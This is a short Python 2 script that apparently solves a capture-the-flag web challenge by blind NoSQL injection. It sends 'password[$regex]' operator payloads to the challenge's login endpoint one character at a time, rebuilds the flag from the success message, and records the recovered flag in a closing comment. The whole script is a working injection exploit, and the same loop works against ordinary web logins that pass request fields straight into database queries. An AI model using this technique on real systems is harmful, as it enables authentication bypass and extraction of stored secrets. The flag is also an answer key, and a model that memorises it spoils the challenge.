#!/usr/bin/env python2

"""
Another blind sql but this time it's NoSQL !
"""

import requests
import string

cookie = dict(session="awesome_cookies_are_awesome")
nonce = "yet_another_nonce"

cur = 0
alphabet = "acABDFwCEW0123456789bedf{}"
flag = ""
while cur < 37:
    for x in alphabet:
        payload = "%s%c.*" % (flag, x)
        #print payload
        r = requests.post("https://challenge-ecw.fr/chals/web200", \
                          data = {'password[$regex]':payload, 'nonce':nonce}, \
                      cookies=cookie)
        if "Authentification valide" in r.text:
            flag += x
            print flag
            cur += 1
            break

# flag is: ECW{797efeb89d8262255fdf5be634427802}
